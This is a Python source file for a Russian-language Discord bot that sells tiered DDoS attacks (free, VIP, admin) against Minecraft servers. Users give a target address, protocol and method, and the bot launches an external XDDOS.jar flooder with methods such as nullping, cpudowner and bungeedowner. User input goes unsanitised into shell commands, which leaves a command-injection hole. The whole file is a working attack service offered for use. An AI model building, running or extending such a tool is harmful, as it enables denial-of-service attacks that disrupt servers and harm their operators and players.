import json
import subprocess
import urllib
import subprocess

import discord
from discord.ui import Button, View
from discord.ext import commands
from discord.ext.commands import has_permissions
TOKEN = ""
TARGET_CPSadmin = int()
ATTACK_TIMEadmin = int()
method1 = []
ATTACK_TIMEvip = int(45)
TARGET_CPSvip = int(10000)
TARGET_CPS = int(5000)
ATTACK_TIME = int(25)
METHODS = ["botjoiner", "join", "xdspam", "chatspam"]
METHODSvip = ["botjoiner", "join", "ram" ,"ultimatekiller", "ping", "nullping", "memory", "bungeedowner", "dispam", "dijoin", "chatspam", "cpudowner", "botraid", "ultimateSmasher"]



timebotter = commands.Bot(command_prefix='.', intents=discord.Intents.all())
timebotter.remove_command('help')

@timebotter.command(name = "free")
async def free_attack(ctx, host, proto, method,):
	if method in METHODS:
		if ctx.channel.id == 1060479195349790820:
			embed=discord.Embed(title="Атака", description="Free-Attacker", color=0x00ff11)
			embed.set_author(name="Атака", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
			embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
			embed.add_field(name=":dart:IP", value=f"```{host}```", inline=False)
			embed.add_field(name=":file_folder:Метод", value=f"```{method}```", inline=True)
			embed.add_field(name=":hourglass_flowing_sand:Время", value=f"```{ATTACK_TIME}``` ", inline=True)
			embed.add_field(name=":satellite:Протокол ", value=f"```{proto}```", inline=True)
			embed.add_field(name=":mammoth:CPS", value=f"```1000 | 500 x2```", inline=True)
			embed.add_field(name=":checkered_flag:Отправил", value=f"{ctx.author.mention}", inline=True)
			embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{host.split(":")[0]}/{host.split(":")[1] if len(host.split(":"))>1 else "25565"}/banner.png') 
			embed.set_footer(text="DragonDi")
			await ctx.message.add_reaction('✅')
			await ctx.send(embed=embed)
			subprocess.Popen(f'java -jar XDDOS.jar {host} {proto} {method} {ATTACK_TIME} {TARGET_CPS} y', shell=True)
    else: await ctx.send("неправильный метод")

@timebotter.command(name= "free-methods")
async def free_attack(ctx):
	embed=discord.Embed(title="Free-methods", color=0x00ff11)
	embed.set_author(name="Methods", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.add_field(name="botjoiner", value="```заходят боты```", inline=True)
	embed.add_field(name="join", value="```заходят боты```", inline=True)
	embed.add_field(name="dispam", value="```спам боты +register v1```", inline=False)
	embed.add_field(name="chatspam", value="```спам боты +register v2```", inline=True)
	embed.set_footer(text="DragonDi")
	await ctx.send(embed=embed)

@timebotter.command(name= "vip-methods")
async def met(ctx):
	embed = discord.Embed(
		title="**Методы**",
		description="""
	join
	botjoiner
	ram
	nullping
	ping
	ultimatekiller
	memory
	dijoin
	dispam
	bungeedowner
	memory
	chatspam
	cpudowner
	botraid
	ultimateSmasher""",
		color=discord.Color.yellow()
	)
	await ctx.send(embed=embed)

@timebotter.command(name = "vip")
async def vip_attack(ctx, host, proto, method,):
	if method in METHODSvip:
		if ctx.channel.id == 1060479606999756830:
			embed=discord.Embed(title="Атака", description="Vip-Attacker" , color=0xff0000)
			embed.set_author(name="Атака", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
			embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
			embed.add_field(name=":dart:IP", value=f"```{host}```", inline=False)
			embed.add_field(name=":file_folder:Метод", value=f"```{method}```", inline=True)
			embed.add_field(name=":hourglass_flowing_sand:Время", value=f"```{ATTACK_TIMEvip}``` ", inline=True)
			embed.add_field(name=":satellite:Протокол ", value=f"```{proto}```", inline=True)
			embed.add_field(name=":mammoth:CPS", value=f"```2000 | 1000 x2```", inline=True)
			embed.add_field(name=":checkered_flag:Отправил", value=f"{ctx.author.mention}", inline=True)
			embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{host.split(":")[0]}/{host.split(":")[1] if len(host.split(":"))>1 else "25565"}/banner.png') 
			embed.set_footer(text="DragonDi")
			await ctx.message.add_reaction('✅')
			await ctx.send(embed=embed)
		subprocess.Popen(f'java -jar XDDOS.jar {host} {proto} {method} {ATTACK_TIMEvip} {TARGET_CPSvip} y', shell=True)
    else: await ctx.send("неправильный метод")

@has_permissions(administrator=True)
@timebotter.command(name = "admin")
async def admin_attack(ctx, host, proto, method, ATTACK_TIMEadmin, TARGET_CPSadmin):
	if ctx.channel.id == 1057406979519303713:
		embed=discord.Embed(title="Атака", description="Admin-Attacker" , color=0xff0000)
		embed.set_author(name="Атака", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
		embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
		embed.add_field(name=":dart:IP", value=f"```{host}```", inline=False)
		embed.add_field(name=":file_folder:Метод", value=f"```{method}```", inline=True)
		embed.add_field(name=":hourglass_flowing_sand:Время", value=f"```{ATTACK_TIMEadmin}``` ", inline=True)
		embed.add_field(name=":satellite:Протокол ", value=f"```{proto}```", inline=True)
		embed.add_field(name=":mammoth:CPS", value=f"```{TARGET_CPSadmin}```", inline=True)
		embed.add_field(name=":checkered_flag:Отправил", value=f"{ctx.author.mention}", inline=True)
		embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{host.split(":")[0]}/{host.split(":")[1] if len(host.split(":"))>1 else "25565"}/banner.png') 
		embed.set_footer(text="DragonDi")
		await ctx.message.add_reaction('✅')
		await ctx.send(embed=embed)
		subprocess.Popen(f'java -jar XDDOS.jar {host} {proto} {method} {ATTACK_TIMEadmin} {TARGET_CPSadmin} y', shell=True)

@timebotter.command(name = "protocol" , color=0x00ff11)
async def prot(ctx):
	embed = discord.Embed(
		title="**Протоколы**",
		description="""`
1.19.3 - 761
1.19.1/2 - 760
1.19 - 759
1.18.2 - 758		
1.18.1 - 757
1.17.1 - 756
1.17 - 755
1.16.5 - 754
1.16.4 - 754
1.16.3 - 753
1.16.2 - 751
1.16.1 - 736
1.16 - 735
1.15.2 - 578
1.15.1 - 575
1.15 - 573
1.14.4 - 498
1.14.3 - 490
1.14.2 - 485
1.14.1 - 480
1.14 - 477
1.13.2 - 404
1.13.1 - 401
1.13 - 393
1.12.2 - 340
1.12.1 - 338
1.12 - 335
1.11.2 - 316
1.11.1 - 316
1.11 - 315
1.10.2 - 210
1.10.1 - 210
1.10 - 210
1.9.4 - 110
1.9.3 - 110
1.9.2 - 109
1.9.1 - 109
1.9 - 107
1.8.9 - 47
1.8.8 - 47
1.8.7 - 47
1.8.6 - 47
1.8.5 - 47
1.8.4 - 47
1.8.3 - 47
1.8.2 - 47
1.8.1 - 47
1.7.10 - 5
1.7.9 - 5
1.7.8 - 5
1.7.7 - 5
1.7.6 - 5
1.7.5 - 4
1.7.4 - 4
1.7.2 - 4`""",
		color=discord.Color.yellow()
	)
	await ctx.send(embed=embed)

@timebotter.command(name = "help")
async def vip_attack(ctx):
	embed=discord.Embed(title="Free help", color=0x00ff11)
	embed.set_author(name="Help", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.add_field(name="Бесплатный ддудос- бета тест", value=f"```.free <ip:port> <protocol|version> <method>```", inline=False)
	embed.add_field(name="Протоколы", value=f"```.protocol```", inline=True)
	embed.add_field(name="Методы", value=f"```.free-methods```", inline=True)
	embed.add_field(name="Узнат статус сервера ", value=f"```.res ip|domen```", inline=True)
	embed.add_field(name="Vip помощь", value=f"```.help-vip```", inline=True)
	embed.add_field(name="Admin", value=f"```dimiprimi#3368```", inline=True)
	embed.set_footer(text="DragonDi")
	await ctx.send(embed=embed)
	await ctx.message.add_reaction('✅')


@timebotter.command(name = "help-vip")
async def vip_attack(ctx):
	embed=discord.Embed(title="VIP help", color=0x00ff11)
	embed.set_author(name="Help-Vip", icon_url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/830451658672177152/1063104178001547427/willatookis_dragon_abstract_5d42358a-7633-4e1f-96e6-f49e58ab329c__1_-round.YgZfF.png")
	embed.add_field(name="Бесплатный ддудос- бета тест", value=f"```.free <ip:port> <protocol|version> <method>```", inline=False)
	embed.add_field(name="Протоколы", value=f"```.protocol```", inline=True)
	embed.add_field(name="Методы", value=f"```.vip-methods```", inline=True)
	embed.add_field(name="Узнат статус сервера ", value=f"```.res ip|domen```", inline=True)
	embed.add_field(name="Vip помощь", value=f"```.help-vip```", inline=True)
	embed.add_field(name="Admin", value=f"```dimiprimi#3368```", inline=True)
	embed.set_footer(text="DragonDi")
	await ctx.message.add_reaction('✅')
	await ctx.send(embed=embed)


@timebotter.command(name = "res", color=0x00ff11)
async def res(ctx, host):
	url = "https://api.mcsrvstat.us/2/" + host
	file = urllib.request.urlopen(url)

	for line in file:
		decoded_line = line.decode("utf-8")

	json_object = json.loads(decoded_line)

	embed = discord.Embed(
		title="Успешно!",
		color=discord.Colour.red()
	)
	if json_object["online"] == "True":
		status = "Выключен / не могу получить данные"
		embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
		embed.add_field(name='Порт:', value=json_object["port"], inline=True)
		embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
		embed.add_field(name="Статус сервера:", value=f"{status}", inline=True)

		g = json_object["ip"]
		gb = json_object["port"]

		# embed.set_thumbnail(
		#	 url='https://cdn.discordapp.com/attachments/911104008968609834/911190533458780170/chupapi-munjanja-ne-budet-6.jpg')
		embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{g}/{gb}/banner.png')
		await ctx.send(embed=embed)
	else:
		statas = "Включён"
		embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
		embed.add_field(name='Порт:', value=json_object["port"], inline=True)
		embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
		embed.add_field(name="Статус сервера:", value=statas, inline=True)

		g = json_object["ip"]
		gb = json_object["port"]

		# embed.set_thumbnail(
		#	 url='https://cdn.discordapp.com/attachments/911104008968609834/911190533458780170/chupapi-munjanja-ne-budet-6.jpg')
		embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{g}/{gb}/banner.png')
		await ctx.send(embed=embed)

@has_permissions(administrator=True)
@timebotter.command(name = 'stop')
async def st(ctx):
	subprocess.Popen("pkill 'java'", shell=True)
	embed = discord.Embed(
		title="**Stop**",
		description="""Все Атаки Остановлены"""
	)
	await ctx.send(embed=embed)

timebotter.run("")
